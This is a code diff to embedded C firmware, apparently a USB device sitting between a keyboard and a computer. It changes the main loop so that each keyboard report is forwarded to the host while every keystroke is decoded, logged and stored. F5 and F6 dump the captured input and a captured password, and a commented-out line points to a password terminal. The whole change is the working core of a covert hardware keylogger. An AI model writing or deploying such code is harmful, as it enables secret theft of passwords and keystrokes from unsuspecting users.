@@ -24,11 +24,28 @@ int main(void)
 
     timer_on();
 
+    uint8_t *report;
+
     while(1) {
-        usbhMainLoop(&USBHD1);
-        chThdSleepMilliseconds(50);
+        //mailbox check
+        chMBFetch(&umb, (msg_t *)&report, TIME_INFINITE);
+
+        /* send the key on the computer */
+        usb_report(&UHD2, report, 8);
+
+        //get every input in a tab
+        uint16_t input = get_input_hid(report);
+        rtt_printf("Key: %c (%04x)", hid2azerty(input), input);
+
+        usbh_add_input(input);
+
+        if(input == KEY_F5)
+            usbh_print_input();
+        if(input == KEY_F6)
+            usbh_print_password();
+        //if(input == KEY_F7)
+        //    usb_password_terminal(&UHD2);
     }
 
-    chThdSleep(TIME_INFINITE);
     return 0;
 }
